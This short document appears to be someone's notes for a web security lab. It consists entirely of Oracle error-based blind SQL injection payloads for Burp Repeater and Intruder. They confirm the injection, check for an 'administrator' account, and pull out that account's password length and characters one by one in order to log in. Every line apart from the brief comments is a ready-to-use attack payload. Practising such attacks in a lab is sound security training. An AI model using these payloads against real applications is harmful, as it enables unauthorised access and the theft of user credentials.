#using burp repeater
#shows error
'+union+select+case+when+(1=1)+then+to_char(1/0)+else+null+end+from+dual--

#dont show error
'+union+select+case+when+(1=2)+then+to_char(1/0)+else+null+end+from+dual--

#check if there is a administrator username
'+union+select+case+when+(username='administrator')+then+to_char(1/0)+else+null+end+from+users--

#using burp intruder
#check the length of the password
'+union+select+case+when+(username='administrator'+AND+length(password)>§1§)+then+to_char(1/0)+else+null+end+from+users--

#check the characters of the password
'+union+select+case+when+(username='administrator'+AND+SUBSTR(password,1,1) > '§a§')+then+to_char(1/0)+else+null+end+from+users--

#login
